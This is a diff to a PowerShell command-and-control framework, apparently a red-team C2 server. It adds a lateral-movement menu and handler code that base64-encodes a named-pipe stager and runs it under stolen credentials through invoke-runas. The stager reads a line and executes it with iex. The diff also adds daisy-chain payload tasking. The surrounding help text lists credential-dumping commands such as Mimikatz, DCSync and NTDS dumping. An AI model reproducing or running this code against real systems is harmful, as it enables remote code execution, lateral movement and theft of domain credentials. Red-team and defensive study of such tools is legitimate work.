@@ -581,12 +581,19 @@ $header = '
         Write-Host " Get-PassPol" -ForegroundColor Green
         Write-Host " Get-PassNotExp" -ForegroundColor Green
         Write-Host " Get-LocAdm" -ForegroundColor Green
-        Write-Host " Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         Write-Host " Invoke-Inveigh -HTTP Y -Proxy Y -NBNS Y -Tool 1" -ForegroundColor Green
         Write-Host " Get-Inveigh | Stop-Inveigh (Gets Output from Inveigh Thread)" -ForegroundColor Green
         Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
         Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
-        Write-Host " Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Command C:\Windows\System32\cmd.exe -Args `" /c calc.exe`"" -ForegroundColor Green        
+        Write-Host " Invoke-Runas -User <user> -Password '<pass>' -Domain <dom> -Command C:\Windows\System32\cmd.exe -Args `" /c calc.exe`"" -ForegroundColor Green                
+        Write-Host " Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
+     } if (($t -eq 0) -or ($t -eq 6)) {
+        write-host `n "Lateral Movement: " -ForegroundColor Green
+        write-host "=========================================================" -ForegroundColor Red
+        Write-Host " Invoke-RunasPayload -User <user> -Password '<pass>' -Domain <dom>" -ForegroundColor Green        
+        Write-Host " Invoke-RunasProxyPayload -User <user> -Password '<pass>' -Domain <dom>" -ForegroundColor Green        
+        Write-Host " Invoke-RunasDaisyPayload -User <user> -Password '<pass>' -Domain <dom>" -ForegroundColor Green        
         write-host " Invoke-DCOMPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-DCOMProxyPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-DCOMDaisyPayload -Target <ip>" -ForegroundColor Green
@@ -595,11 +602,10 @@ $header = '
         write-host " Invoke-PsExecDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
-        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green
-        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
+        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green        
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
-    } if (($t -eq 0) -or ($t -eq 6)) {
+    } if (($t -eq 0) -or ($t -eq 7)) {
         write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
         write-host "=========================================================" -ForegroundColor Red
         write-host " Invoke-Mimikatz | Out-String | Parse-Mimikatz" -ForegroundColor Green
@@ -620,7 +626,7 @@ $header = '
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
         write-host " Dump-NTDS -EmptyFolder <emptyfolderpath>" -ForegroundColor Green
-    } if (($t -eq 0) -or ($t -eq 7)) {
+    } if (($t -eq 0) -or ($t -eq 8)) {
         write-host `n "Useful Modules: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
@@ -1969,10 +1975,12 @@ param
             if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
             { 
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
-                CheckModuleLoaded "invoke-runaspayload.ps1" $psrandomuri
+                CheckModuleLoaded "Invoke-RunAs.ps1" $psrandomuri
                 $pscommand = $pscommand -replace 'invoke-runaspayload', ''
-                $pscommand = "invoke-runaspayload $($pscommand)"
-                
+                $psCommandBase = "add-Type -assembly System.Core; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+                $bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommandBase)
+                $encodedCommand= [Convert]::ToBase64String($bytes)
+                $pscommand = "invoke-runas $($pscommand) -command C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Args `" -e $encodedCommand`""
             }     
             if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
             { 
@@ -1985,12 +1993,38 @@ param
                     Command   = '$proxypayload = "'+$proxypayload+'"'
                 } | Out-Null
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
-                CheckModuleLoaded "invoke-runasproxypayload.ps1" $psrandomuri
+                CheckModuleLoaded "Invoke-RunAs.ps1" $psrandomuri
                 $pscommand = $pscommand -replace 'invoke-runasproxypayload', ''
-                $pscommand = "invoke-runasproxypayload $($pscommand)"
+                $psCommandBase = "add-Type -assembly System.Core; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+                $bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommandBase)
+                $encodedCommand= [Convert]::ToBase64String($bytes)
+                $pscommand = "invoke-runas $($pscommand) -command C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Args `" -e $encodedCommand`""
                 } else {
                 write-host "Need to run CreateProxyPayload first"
                 $pscommand = $null
+                }
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-runasdaisypayload'))
+            { 
+                $name = Read-Host "Name"
+                if (Test-Path "$FolderPath\payloads\$($name).bat"){
+                    $daisypayload = Get-Content -Path "$FolderPath\payloads\$($name).bat"  
+                    $query = "INSERT INTO NewTasks (RandomURI, Command)
+                    VALUES (@RandomURI, @Command)"
+                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                        RandomURI = $psrandomuri
+                        Command   = '$daisypayload = "'+$daisypayload+'"'
+                    } | Out-Null
+                    CheckModuleLoaded "NamedPipeDaisy.ps1" $psrandomuri
+                    CheckModuleLoaded "Invoke-RunAs.ps1" $psrandomuri
+                    $pscommand = $pscommand -replace 'invoke-runasdaisypayload', ''
+                    $psCommandBase = "add-Type -assembly System.Core; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommandBase)
+                    $encodedCommand= [Convert]::ToBase64String($bytes)
+                    $pscommand = "invoke-runas $($pscommand) -command C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Args `" -e $encodedCommand`""
+                } else {
+                    write-host "Need to run Invoke-DaisyChain first"
+                    $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('get-proxy')) 
